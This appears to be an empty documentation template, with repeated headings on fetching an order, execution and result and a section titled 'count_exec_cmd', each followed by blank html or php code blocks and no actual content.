```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="count_exec_cmd"></a>
# count_exec_cmd  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```
